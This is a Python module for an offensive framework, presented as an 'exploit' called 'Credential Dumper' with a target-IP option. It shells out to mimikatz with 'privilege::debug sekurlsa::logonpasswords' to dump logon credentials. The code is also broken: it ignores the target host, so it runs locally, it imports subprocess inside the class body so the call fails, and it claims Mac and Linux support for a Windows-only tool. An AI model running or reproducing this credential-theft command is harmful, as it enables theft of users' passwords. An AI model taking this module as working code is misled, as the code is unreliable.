import pyfiglet
from collections import OrderedDict

MODULE_TYPE = "exploit"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Credential Dumper',
            'Rank':'Good',
            'Platform':'Windows/Linux/Mac',
            'architectures':'x86/64 bit processors',
            'Description': 'Dumps credentials from Target',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
            ('RHOST', ('', False,'Enter target IP')),
           
               
                ])
                }
    def logo(self):
    	title = 'Credential Dumper'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set RHOST <ip_address> , then run")
   
    import subprocess
    def credential_dumper(self,host=None):
      command = "mimikatz.exe privilege::debug sekurlsa::logonpasswords"
      subprocess.run(command, shell=True)
    
    
    def execute(self):
        self.logo()
        host = self.info['Options']['RHOST'][0]
        self.credential_dumper(host=None)
        
        return f"[+] Dumping Credentials ..."
    